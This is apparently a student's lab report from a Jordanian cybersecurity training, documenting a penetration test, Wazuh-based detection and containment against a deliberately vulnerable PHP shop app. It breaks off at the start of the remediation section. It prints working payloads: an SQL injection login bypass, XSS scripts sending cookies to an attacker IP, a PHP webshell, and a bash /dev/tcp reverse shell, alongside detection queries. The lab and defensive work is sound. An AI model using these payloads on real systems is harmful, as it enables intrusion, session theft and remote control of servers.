---
title: "Masar V10 Final Project Assignment Report"
categories: Lab
tags: pentesting web-security
toc: true
mermaid: ture
---

Masar is a training for university students provided by the National Cyber Security Center (NCSC) in Jordan.

Report date: 2026-05-07

Important note: IP addresses in screenshots and logs may differ from the current VM addresses because the lab uses DHCP. The saved evidence primarily shows VM1 as `10.10.10.6`, VM2 as `10.10.10.9`, and VM3 as `10.10.10.3`. Later reverse shell evidence uses VM3 at `192.168.230.130`.

This assignment report intentionally does not include persistence or backdoor creation steps. The project requirement for offensive access was satisfied by proving remote code execution and obtaining an interactive reverse shell on VM1. Persistence was left out of scope to keep the lab controlled and to make containment and remediation clear.

---

# 1. Assignment Context

## 1.1 Assignment Lab Overview

This report documents the Masar V10 final project as an assignment lab. The lab was built with three VMware virtual machines: a vulnerable Debian web server, a separate Debian Wazuh server, and a Kali attacker workstation. The purpose of the lab was to show the full workflow required by the assignment: prepare the environment, deploy the vulnerable app, perform exploitation, forward logs into Wazuh, investigate the attack, contain attacker artifacts, patch the code, and verify that the original exploits no longer work.

The target application, TechNest, was intentionally created with multiple web vulnerabilities. All actions described in this report were performed only inside the authorized project lab.

## 1.2 Objectives

The lab objectives:

- Build a working vulnerable web application on VM1.
- Deploy Wazuh on VM2 and confirm access to the dashboard and archive data.
- Forward Apache and bash command logs from VM1 to VM2.
- Exploit SQL injection, stored XSS, unrestricted file upload, and OS command injection from VM3.
- Prove remote code execution with an interactive reverse shell.
- Reconstruct the attack in Wazuh and perform containment checks.
- Patch each vulnerable area in the application and store the fixes in Git.
- Re-test the original attack paths and confirm the patched behavior.

## 1.3 Scope And Constraints

In scope:

- VM1 TechNest application and supporting Linux services.
- VM2 Wazuh manager, dashboard, indexer, Filebeat, and archive views.
- VM3 attacker-side testing with browser, Burp Suite, `nmap`, `gobuster`, `curl`, and `nc`.
- Application routes related to authentication, reviews, file upload, diagnostics, and logging.

Out of scope:

- Persistence or backdoor creation.
- Denial-of-service activity.
- Attacks against the Windows host or unrelated machines.
- Public disclosure of credentials.

## 1.4 Evidence Notes

The primary evidence source for this report is `final project v2 note.md`. Screenshots are preserved using Obsidian embed syntax so the assignment evidence remains attached to the report. The main report uses representative screenshots only, while the full capture set remains in the note and appendix evidence list. Because the lab uses DHCP, older screenshots show VM1 as `10.10.10.6`, VM2 as `10.10.10.9`, and VM3 as `10.10.10.3`, while later validation commands show current addresses in the `192.168.230.0/24` range.

---

# 2. Lab Infrastructure And Build

## 2.1 Lab Topology

The assignment lab used three VMs connected on the same internal network. VM3 generated the attack traffic, VM1 hosted the vulnerable application and local logs, and VM2 received those logs through Wazuh.

![](/assets/images/lab/masar-final-project/pasted-data-imageacaacb_ryNe.png)

## 2.2 Virtual Machine Inventory

| VM | Role | OS | Key Services / Tools | Evidence IPs |
| --- | --- | --- | --- | --- |
| VM1 | Vulnerable target | Debian 13.x | Apache, PHP, MariaDB, Wazuh agent, rsyslog | `10.10.10.6`, later `192.168.230.133` |
| VM2 | SIEM server | Debian 13.x | Wazuh manager, indexer, dashboard, Filebeat | `10.10.10.9`, later `192.168.230.134` |
| VM3 | Attacker VM | Kali Linux | Browser, Burp Suite, `nmap`, `gobuster`, `curl`, `nc` | `10.10.10.3`, later `192.168.230.130` |

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image57d7d7_ryNe.png)

## 2.3 VM1 Target Application Build

VM1 hosted the TechNest application under `/var/www/html/app`. The saved build evidence shows the web stack, file structure, Git repository, database, and HTTPS Apache configuration. The application used PHP pages backed by MariaDB and served through Apache over HTTPS.

Service validation evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image636f17_ryNe.png)

Database and application structure evidence:

![](/assets/images/lab/masar-final-project/pasted-data-imagea583d2_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagebc3940_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image6382f7_ryNe.png)

HTTPS configuration evidence:

![](/assets/images/lab/masar-final-project/pasted-data-imagef6e398_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageba1db3_ryNe.png)

## 2.4 Baseline Functional Verification

Before exploitation, the application was tested in its normal state. The evidence confirms that the login page loaded, the admin login worked, product browsing worked, review submission worked, account upload accepted a normal image, the order tracker returned a normal response, and the search page loaded.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image48bca4_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imaged5e1a4_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image326507_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image542ca5_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image29dd1c_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image11c61a_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imaged07207_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagec8990e_ryNe.png)

## 2.5 Intentional Vulnerability Baseline

The assignment required a vulnerable web application baseline. TechNest included four intentional weaknesses:

| Vulnerability | File / Function | Baseline Security Issue |
| --- | --- | --- |
| SQL injection | `login.php` | User input was concatenated into the authentication query. |
| Stored XSS | `product.php` | Review content was stored and rendered without safe output encoding. |
| Unrestricted file upload | `account.php` | User-controlled filenames and extensions were accepted into `uploads/`. |
| OS command injection | `diagnostics.php` | User input was passed into a shell command without proper validation. |

The vulnerable baseline was preserved in Git with tag `v1.0-vulnerable-baseline`.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-imageceaf9c_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagea859e8_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image015fb9_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagea1ae73_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image4fa269_ryNe.png)

## 2.6 VM2 Wazuh Deployment

VM2 hosted the monitoring stack required by the assignment. The Wazuh dashboard, manager, indexer, and Filebeat components were installed and verified. The important reachable services were the dashboard on `443/tcp`, Wazuh agent transport on `1514/tcp`, enrollment on `1515/tcp`, and the API on `55000/tcp`.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image2b7456_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagec8f8de_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image8d7458_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagee4fb65_ryNe.png)

## 2.7 VM1 Log Forwarding To Wazuh

VM1 was configured as Wazuh agent `vm1-technest`. The assignment required forwarding Apache logs and bash command history to VM2. The implemented collector set on VM1 used these log sources:

| Log Path | Wazuh Format | Purpose |
| --- | --- | --- |
| `/var/log/apache2/vulnapp_access.log` | `apache` | Capture HTTP methods, paths, status codes, and source IPs. |
| `/var/log/apache2/vulnapp_error.log` | `apache` | Capture Apache-side errors. |
| `/var/log/bash_commands.log` | `syslog` | Capture bash command history through `logger` and `rsyslog`. |

Bash command logging was configured through `/etc/bash.bashrc` with `PROMPT_COMMAND` and `logger -p local6.notice`, and rsyslog routed `local6.*` to `/var/log/bash_commands.log`.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image23ea24_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image88e99b_ryNe.png)

## 2.8 Archive Visibility In Wazuh

The Wazuh archive requirement was satisfied by enabling archive visibility and using the `wazuh-archives-4.x-*` data view. The saved evidence shows Apache and bash events from VM1 inside Wazuh archive data, which later enabled Student 3 timeline reconstruction and Student 4 post-patch verification.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image3d1f27_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagea052f4_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image8044f0_ryNe.png)

## 2.9 Section 2 Summary

By the end of the build phase, the assignment lab had a working vulnerable application on VM1, a functioning Wazuh deployment on VM2, a reachable attacker workstation on VM3, a baseline Git tag for the vulnerable app, and verified forwarding of Apache and bash command logs into Wazuh. Those prerequisites enabled the exploitation, investigation, and remediation work documented in the following sections.

---

# 3. Penetration Testing Report

## 3.1 Engagement Overview

The penetration test was performed against the TechNest vulnerable web application hosted on VM1. The assessment followed a black-box methodology from the attacker workstation, using only externally observable application behavior, browser testing, Burp Suite interception, command-line enumeration, and exploit validation through the exposed web interface.

The target application was reachable over HTTPS and used Apache/PHP with PHP session cookies. The objective was to enumerate the application, identify the implemented vulnerabilities, exploit each vulnerability safely, and prove remote code execution where applicable.

### 3.1.1 Scope And Rules Of Engagement

In scope:

- VM1 TechNest web application.
- HTTPS application endpoints exposed by Apache.
- Authentication, product reviews, account upload, and diagnostics/order tracking functionality.
- SIEM-visible activity generated through Apache and bash history forwarding.

Out of scope:

- Attacks against unrelated VMs or host systems.
- Denial-of-service testing.
- Persistence/backdoor creation.
- Destructive data modification beyond temporary proof-of-concept artifacts such as the uploaded `shell.php`.

### 3.1.2 Methodology

The assessment followed this sequence:

1. Reconnaissance and service enumeration.
2. Web directory discovery.
3. Manual browsing and application mapping.
4. Input fingerprinting with Burp Suite.
5. Exploitation of SQL injection, stored XSS, file upload, and OS command injection.
6. Remote code execution proof using `id`, `hostname`, and `ip a`.
7. Interactive reverse shell proof.
8. Evidence handoff for detection, containment, and remediation.

### 3.1.3 Tools Used

| Tool | Purpose |
| --- | --- |
| Browser | Manual application navigation |
| Burp Suite | Request/response inspection and replay |
| `nmap` | Network and service enumeration |
| `gobuster` | Directory discovery |
| `curl` | HTTP verification |
| `nc` / Netcat | Reverse shell listener |
| Wazuh Discover | SIEM validation and timeline analysis |

## 3.2 Reconnaissance And Enumeration

Network enumeration was performed with `nmap`. The scan identified the web service exposed by VM1 and confirmed that the target was reachable from the attacker environment.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-imagead66e7_ryNe.png)

Directory enumeration was performed with `gobuster` to identify accessible paths and application routes.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-imagecf43aa_ryNe.png)

Manual browsing confirmed the main application pages, including login, product pages, account upload, search, and diagnostics/order tracking.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image7f64af_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageaddafd_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagefbf03e_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image98f1aa_ryNe.png)

## 3.3 Vulnerability Assessment

### 3.3.1 SQL Injection - Authentication Bypass

Affected endpoint:

```text
POST /login.php
```

The login page was fingerprinted through browser testing and Burp Suite. The response headers identified Apache/PHP behavior, including a `PHPSESSID` cookie.

Observed response header details:

```text
Server: Apache/2.4.66 (Debian)
Cookie: PHPSESSID=<session-id>
```

![](/assets/images/lab/masar-final-project/pasted-data-image5b57be_ryNe.png)

The login form accepts `username` and `password` fields:

```html
<form method="POST">
<input name="username" placeholder="Username" autocomplete="off">
<input name="password" type="password" placeholder="Password">
<button>Sign in</button>
</form>
```

Input testing showed that a backslash and single quote caused HTTP 500 errors, while a double quote returned HTTP 200. This behavior indicated that the application was likely placing user input inside a single-quoted SQL string without safe parameter binding.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image6c7b5d_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagea1f8ae_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image3968ad_ryNe.png)

The payload `admin' -- -` bypassed authentication and logged into the application without needing the correct password.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image7d3f99_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image8ec8b5_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagec694da_ryNe.png)

Additional testing with an always-true condition returned a successful redirect response:

```text
admin' or 1=1 -- -
```

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image053ab6_ryNe.png)

The HTTP `302` response confirms that the SQL condition evaluated to true and a row was returned, but the authenticated session was not usable in this case because `login.php` uses the first matching row directly and the attacker had no control over which row was returned. The `admin' -- -` payload is the reliable bypass because it targets a known username explicitly.

Risk rating: High

Impact:

- Authentication bypass.
- Unauthorized access as an application user.
- Potential data exposure depending on reachable authenticated pages.

Recommendation:

- Replace string-concatenated SQL with prepared statements.
- Validate and normalize login input.
- Return generic login errors and avoid leaking SQL failures through HTTP 500 responses.

### 3.3.2 Stored Cross-Site Scripting

Affected endpoint:

```text
POST /product.php?id=1
GET /product.php?id=1
```

The product page included a review form. Submitting script content in the review field caused stored JavaScript execution when the product page was loaded again.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image448269_ryNe.png)

Initial XSS proof:

```html
<script>alert(1)</script>
```

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image59dc87_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image6bb7c2_ryNe.png)

An attempted cookie theft payload was submitted:

```html
<script>fetch(`http://10.10.10.3:8000/?c=`+document.cookie)</script>
```

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image74a47e_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image9deb71_ryNe.png)

The browser blocked the HTTP exfiltration attempt from the HTTPS application context as mixed content.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-imageaa01d5_ryNe.png)

HTTP listener setup for the follow-on tests:

![](/assets/images/lab/masar-final-project/pasted-data-image015a53_ryNe.png)

To demonstrate the stored nature of the vulnerability, the victim user `john` logged in and loaded the affected product page. The payload fired in the victim's browser context without any action from the attacker beyond the initial malicious review submission.

Victim user `john` login:

![](/assets/images/lab/masar-final-project/pasted-data-imageb90082_ryNe.png)

Victim user `john` loading the affected product page:

![](/assets/images/lab/masar-final-project/pasted-data-image5c0561_ryNe.png)

After the first `fetch()` payload was blocked by mixed content, three more payloads were attempted in sequence:

Payload 2 - image object over HTTP:

```html
<script>new Image().src=`http://10.10.10.3:8000/?c=`+document.cookie</script>
```

Result: still blocked by mixed content enforcement.

![](/assets/images/lab/masar-final-project/pasted-data-imaged2e67b_ryNe.png)

Payload 3 - image object over HTTPS with self-signed listener:

```html
<script>new Image().src=`https://10.10.10.3:4443/?c=`+document.cookie</script>
```

Result: browser rejected the self-signed certificate, TLS handshake failed. 

Due to constraints within the lab environment, self-signed certificates were used; however, in a real-world attack scenario, an adversary can easily register a custom domain and obtain a valid TLS/SSL certificate from a trusted Certificate Authority (CA).

![](/assets/images/lab/masar-final-project/pasted-data-image06cef1_ryNe.png)

Payload 4 - image error handler over HTTPS:

```text
<img src="x" onerror="this.src=`https://10.10.10.3:4443/?c=`+document.cookie">
```

Result: same TLS certificate rejection.

![](/assets/images/lab/masar-final-project/pasted-data-imageb74e6f_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image5ebe61_ryNe.png)

This still validated the stored XSS vulnerability because JavaScript executed in the victim browser context even though cookie exfiltration was prevented by transport security controls.

Risk rating: High

Impact:

- Stored JavaScript execution against users who view the affected product review.
- Possible session theft if transport and certificate restrictions are satisfied.
- Potential account actions under the victim's session context.

Recommendation:

- Encode review output with `htmlspecialchars` or equivalent.
- Validate and sanitize review input.
- Add a Content Security Policy to reduce script execution impact.
- Mark session cookies `HttpOnly`, `Secure`, and `SameSite`.

### 3.3.3 File Upload Vulnerability

Affected endpoint:

```text
POST /account.php
```

The account page accepted avatar/profile uploads. A PHP webshell file named `shell.php` was uploaded successfully.

Payload file:

```text
<?php system($_GET["cmd"]); ?>
```


Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image1b894f_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageff5b9b_ryNe.png)

The uploaded file was reachable in the web-accessible uploads directory and accepted a command through the `cmd` query parameter.

Trigger URL:

```text
https://10.10.10.6/uploads/shell.php?cmd=ls
```

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image1bf0c2_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagec7ab3e_ryNe.png)

Burp Suite Repeater was used to validate command execution:

```text
https://10.10.10.6/uploads/shell.php?cmd=id
https://10.10.10.6/uploads/shell.php?cmd=hostname
https://10.10.10.6/uploads/shell.php?cmd='ip+a'
```

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image2cb1c1_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image298162_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image24d093_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageba693d_ryNe.png)

A reverse shell attempt through this webshell did not succeed. The error showed that the PHP `system()` argument handling or URL encoding caused the command to be empty, and the shell did not connect through that path.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image3c469c_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image8d3dbf_ryNe.png)

Risk rating: Critical

Impact:

- Upload of executable PHP into a web-accessible directory.
- Remote command execution through the webshell.
- Potential full application compromise as the web server user.

Recommendation:

- Allow only expected image extensions and MIME types.
- Rename uploads to server-generated names.
- Store uploads outside the web root where possible.
- Disable PHP execution in upload directories.
- Validate file content and reject scripts.

### 3.3.4 OS Command Injection

Affected endpoint:

```text
POST /diagnostics.php
```

The diagnostics/order tracking page accepted a host-like input. Injecting a shell separator and the `id` command caused command execution on VM1.

Payload:

```text
127.0.0.1 ; id
```

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image926c59_ryNe.png)

This confirmed RCE through the diagnostics feature.

Risk rating: Critical

Impact:

- Direct server-side command execution.
- Ability to run commands as the web server user.
- Ability to establish an interactive shell when outbound connectivity is available.

Recommendation:

- Do not pass user input to shell commands.
- Use safe APIs or strict allowlists.
- If ping-like diagnostics are required, validate input as an IP address or hostname and execute without shell interpretation.

## 3.4 Exploitation

### 3.4.1 Exploit Chain Walkthrough

The exploit chain progressed as follows:

1. Reconnaissance identified the HTTPS web service and application paths.
2. SQL injection bypassed the login form and established authenticated access.
3. Stored XSS was confirmed in product reviews.
4. File upload accepted `shell.php` and allowed command execution through a web-accessible upload path.
5. OS command injection in `diagnostics.php` produced direct RCE.
6. The command injection path was used to establish a reverse shell from VM1 to VM3.

### 3.4.2 Webshell And Reverse Shell Delivery

Webshell delivery was proven through the account upload functionality. The webshell executed commands such as `id`, `hostname`, and `ip a` through the `cmd` query parameter.

Interactive shell access was then achieved through the OS command injection vulnerability rather than through the uploaded webshell.

The attacker started a listener:

```text
nc -lvnp 4444
```

The exact payload submitted through the diagnostics field was:

```text
bash -c 'bash -i 5<> /dev/tcp/192.168.230.130/4444 0<&5 1>&5 2>&5'
```

The file-descriptor redirect variant was used because the standard `>&` form failed in this shell context. By this point in the lab, the VM3 attacker IP had changed by DHCP to `192.168.230.130`.

The command injection field was used to trigger a reverse shell to the attacker host. The saved evidence shows the payload submitted through the diagnostics input and captured in Burp Suite.

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image49e688_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagedfdcca_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageb04a4e_ryNe.png)

### 3.4.3 Proof Of Access

After the reverse shell connected, the following commands were executed to prove access:

```text
id
hostname
ip a
```

Evidence:

![](/assets/images/lab/masar-final-project/pasted-data-imageac661d_ryNe.png)

This satisfied the project requirement to achieve RCE and obtain an interactive command shell on VM1.

## 3.5 Post-Exploitation Summary

After obtaining the interactive reverse shell, activity was limited to proof-of-access commands: `id`, `hostname`, and `ip a`. No privilege escalation, lateral movement, data exfiltration, persistence mechanism, new user account, SSH key, cron job, or startup service was created. The shell was used only long enough to satisfy the assignment requirement for interactive RCE proof on VM1.

## 3.6 Risk Rating Summary

| Finding | Severity | Business Impact |
| --- | --- | --- |
| File upload to executable web path | Critical | Remote command execution through uploaded PHP |
| OS command injection | Critical | Interactive shell as web server user |
| SQL injection login bypass | High | Unauthorized authenticated access |
| Stored XSS | High | JavaScript execution against users viewing product reviews |

## 3.7 Recommendations Handed To Student performing IR

Priority fixes:

1. Remove direct shell execution from diagnostics.
2. Block PHP/script execution in uploads and enforce image-only upload controls.
3. Replace vulnerable SQL with prepared statements.
4. Encode all user-generated review output.
5. Keep Wazuh logging enabled during re-tests so blocked attempts remain visible.

# 4. Incident Response And Detection

## 4.1 Investigation Methodology

The incident response phase used Wazuh on VM2 to reconstruct the attack against VM1. VM1 forwards Apache application logs and bash command logs through the Wazuh agent named `vm1-technest`.

The investigation followed a structured path:

1. Confirm the telemetry path is healthy: VM1 agent connected, archive indexing enabled, and the correct Wazuh data view selected.
2. Start with a broad archive query for all VM1 Apache events to scope the time window and routes involved.
3. Pivot to route-specific queries for `login.php`, `product.php`, `account.php`, `shell.php`, and `diagnostics.php`.
4. Correlate those route hits with the saved offensive evidence and the bash command log from VM1.
5. Remove the confirmed attacker artifact and check common persistence locations.
6. Re-run representative blocked tests after patching and confirm that Wazuh still logs the attempts.

During the final completion work, the VM addresses had changed by DHCP:

```text
VM1 Target/Agent: 192.168.230.133
VM2 Wazuh:        192.168.230.134
VM3 Attacker:     192.168.230.130
```

VM1 still had the old Wazuh manager address `10.10.10.9` in `/var/ossec/etc/ossec.conf`, so the agent was active locally but not connected to VM2. The manager address was updated to `192.168.230.134`, `wazuh-agent` was restarted, and VM2 confirmed the agent was Active again:

```text
Wazuh agent_control. List of available agents:
ID: 000, Name: debian (server), IP: 127.0.0.1, Active/Local
ID: 001, Name: vm1-technest, IP: any, Active
```

Forwarded log sources used for investigation:

```javascript
/var/log/apache2/vulnapp_access.log
/var/log/apache2/vulnapp_error.log
/var/log/bash_commands.log
```

The raw archive data view required in Wazuh Discover is:

```text
wazuh-archives-4.x-*
```

This archive view is the correct starting point because it preserves the raw forwarded events instead of only higher-level alert records.

Representative evidence from the original SIEM setup and log forwarding:

![](/assets/images/lab/masar-final-project/pasted-data-image23ea24_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image88e99b_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image3d1f27_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image8044f0_ryNe.png)

## 4.2 SIEM-Based Timeline Reconstruction

### 4.2.1 Apache Log Analysis

The investigation began with a broad scoping query across VM1 Apache access logs:

```javascript
agent.name: "vm1-technest" and location: "/var/log/apache2/vulnapp_access.log"
```

This query is used first to verify that the correct agent is sending web events and to identify the time window, source IP, HTTP methods, status codes, and routes involved. After that scoping step, the investigation pivots to the vulnerable routes.

![](/assets/images/lab/masar-final-project/pasted-data-imagee4853c_ryNe.png)

Wazuh archives contained historical attack evidence for the following routes:

```text
POST /login.php
POST /account.php
GET /uploads/shell.php?cmd=...
POST /diagnostics.php
```

Example counts from Wazuh archive indexing:

```text
POST /login.php:        63
POST /product.php:      19
POST /account.php:       2
shell.php:              45
POST /diagnostics.php:   9
```

Important limitation: Apache access logs show HTTP method, route, status code, source IP, and user agent. They do not show POST body fields by default, so SQLi and stored XSS payload content must be correlated from Burp/browser screenshots and route timing rather than claimed directly from raw Apache POST bodies.

Route-specific investigation queries:

```text
agent.name: "vm1-technest" and full_log: "POST /login.php"
```

```text
agent.name: "vm1-technest" and full_log: "POST /product.php"
```

```text
agent.name: "vm1-technest" and full_log: "POST /account.php"
```

```text
agent.name: "vm1-technest" and full_log: "shell.php"
```

```text
agent.name: "vm1-technest" and full_log: "POST /diagnostics.php"
```

This route-first query sequence is the correct investigation method for this lab because it relies on fields that are actually visible in the collected logs.

### 4.2.2 Bash History Analysis

Bash command evidence is searched with:

```javascript
agent.name: "vm1-technest" and location: "/var/log/bash_commands.log"
```

The saved Wazuh evidence shows bash command forwarding was working, including administrative and investigation commands executed on VM1. This source is used after the Apache scoping step to confirm post-compromise activity and later containment actions on the server.

Representative Wazuh bash evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image02a767_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image00d01a_ryNe.png)

### 4.2.3 Correlated Attack Timeline

| Phase | Evidence Source | Event | Impact |
| --- | --- | --- | --- |
| Reconnaissance | Screenshot / Apache logs | `nmap` and `gobuster` against VM1 | Services and web paths identified |
| SQL Injection | Burp/browser and `POST /login.php` logs | Login bypass using `admin' -- -` | Unauthorized authenticated access |
| Stored XSS | Product page screenshots | Review containing JavaScript rendered on page | Stored client-side code execution |
| File Upload | `POST /account.php` and `GET /uploads/shell.php` logs | Uploaded `shell.php` and executed `cmd=id` | Webshell command execution |
| Command Injection | `POST /diagnostics.php` logs | Injected shell command in diagnostics field | Server-side RCE |
| Foothold | Reverse shell screenshot | `id`, `hostname`, `ip a` run from shell | Interactive command shell on VM1 |
| Containment | VM1 command evidence | Deleted `/var/www/html/app/uploads/shell.php` | Removed known attacker artifact |

Representative timeline evidence:

![](/assets/images/lab/masar-final-project/pasted-data-image298162_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image926c59_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageac661d_ryNe.png)

## 4.3 Containment And Remediation

### 4.3.1 SSH Access to VM1

Containment was performed using legitimate administrative access to VM1, not through the attacker reverse shell. The containment sequence was:

1. Confirm the malicious file path from the web and filesystem evidence.
2. Remove the artifact from the upload directory.
3. Verify that the path no longer contains executable attacker content.
4. Inspect common persistence locations.
5. Re-test the blocked path and confirm the result in Apache and Wazuh.

![](/assets/images/lab/masar-final-project/pasted-data-image1ddd17_ryNe.png)

### 4.3.2 Webshell / Artifact Identification And Deletion

Known attacker artifact:

```javascript
/var/www/html/app/uploads/shell.php
```

Before containment, VM1 showed:

```javascript
-rw-r--r-- www-data www-data 31 2026-05-07 00:48 /var/www/html/app/uploads/shell.php
SHA256: ac5b099b97c6536012276c5e61c50d4f4fe6fd606bd861c5c15f769153452e68
```

Containment action:

```bash
sudo rm -f /var/www/html/app/uploads/shell.php
```

bash

![](/assets/images/lab/masar-final-project/pasted-data-image3cafad_ryNe.png)

Final verification after remediation also showed no `shell.php` under the app and Apache returned `403 Forbidden` for `/uploads/shell.php?cmd=id` because PHP/script extensions are denied in the uploads directory.

### 4.3.3 Persistence Check And Clearance Confirmation

Persistence was not intentionally created during the controlled attack. The following checks were performed to confirm no persistence remained:

```bash
sudo crontab -l
crontab -l
sudo find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly -maxdepth 1 -type f -ls
sudo find /etc/systemd/system -type f -mtime -7 -ls
cat /etc/passwd | tail
find /home -maxdepth 3 -path '*/.ssh/*' -type f -ls
sudo find /root/.ssh -maxdepth 2 -type f -ls
```

bash

Results:

![](/assets/images/lab/masar-final-project/pasted-data-image26b181_ryNe.png)

Conclusion: the known webshell was removed, and no persistence mechanism was identified.

## 4.4 Detection Engineering

All queries below are intended for the `wazuh-archives-4.x-*` data view.

The query logic starts with the route where the suspicious action occurs. Content-based filters are added only when that content is actually visible in the collected logs. This keeps the detection approach aligned with the real telemetry available in the lab.

### 4.4.1 Suspicious File Upload Detection

Upload activity:

```javascript
agent.name: "vm1-technest" and location: "/var/log/apache2/vulnapp_access.log" and full_log: "POST /account.php"
```

![](/assets/images/lab/masar-final-project/pasted-data-imageb23f22_ryNe.png)

Webshell access:

```text
agent.name: "vm1-technest" and full_log: "shell.php"
```

PHP in upload path:

```text
agent.name: "vm1-technest" and full_log: "/uploads/" and full_log: ".php"
```

![](/assets/images/lab/masar-final-project/pasted-data-image8d81b9_ryNe.png)

### 4.4.2 Stored XSS Detection

Review submission route:

```javascript
agent.name: "vm1-technest" and location: "/var/log/apache2/vulnapp_access.log" and full_log: "POST /product.php"
```

![](/assets/images/lab/masar-final-project/pasted-data-imagef7ce49_ryNe.png)

Payload-oriented query if request bodies or query-string payloads are available:

```html
agent.name: "vm1-technest" and (full_log: "<script" or full_log: "onerror=" or full_log: "document.cookie")
```

### 4.4.3 OS Command Injection Detection

Diagnostics route:

```javascript
agent.name: "vm1-technest" and location: "/var/log/apache2/vulnapp_access.log" and full_log: "POST /diagnostics.php"
```

![](/assets/images/lab/masar-final-project/pasted-data-imageae6df5_ryNe.png)

Payload-oriented query if payloads are visible:

```text
agent.name: "vm1-technest" and (full_log: ";" or full_log: "&&" or full_log: "|" or full_log: "/dev/tcp")
```

Post-compromise command evidence:

```javascript
agent.name: "vm1-technest" and location: "/var/log/bash_commands.log"
```

### 4.4.4 SQL Injection Detection

Login route:

```javascript
agent.name: "vm1-technest" and location: "/var/log/apache2/vulnapp_access.log" and full_log: "POST /login.php"
```

![](/assets/images/lab/masar-final-project/pasted-data-image95f285_ryNe.png)

Payload-oriented query if payloads are visible:

```text
agent.name: "vm1-technest" and (full_log: "' --" or full_log: "or 1=1" or full_log: "union select")
```

## 4.5 Query Validation Evidence

The following screenshots show each detection query running against the `wazuh-archives-4.x-*` data view and returning results from the attack and re-test window.

File upload and webshell access:

![](/assets/images/lab/masar-final-project/pasted-data-imageb23f22_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image8d81b9_ryNe.png)

Stored XSS review submission:

![](/assets/images/lab/masar-final-project/pasted-data-image0f950f_ryNe.png)

OS command injection:

![](/assets/images/lab/masar-final-project/pasted-data-imageae6df5_ryNe.png)

SQL injection login attempts:

![](/assets/images/lab/masar-final-project/pasted-data-image95f285_ryNe.png)

Validation token used for re-test correlation: `codex-retest-20260507-200709`

Archive route counts at validation:

POST /login.php: 3 POST /product.php: 1 POST /account.php: 2 GET /uploads/shell.php: 1 POST /diagnostics.php: 3 Indexer count for token: 11

All five detection queries return results. The application blocks re-exploitation while Wazuh continues to log the blocked attempts, confirming detection coverage remains active after remediation.

---

# 5. Mitigation And Re-Exploitation

## 5.1 Version Control Setup

The vulnerable baseline was already committed before remediation:

```text
fbab3fe (tag: v1.0-vulnerable-baseline) initial commit: TechNest vulnerable baseline v1.0
```

Evidence:

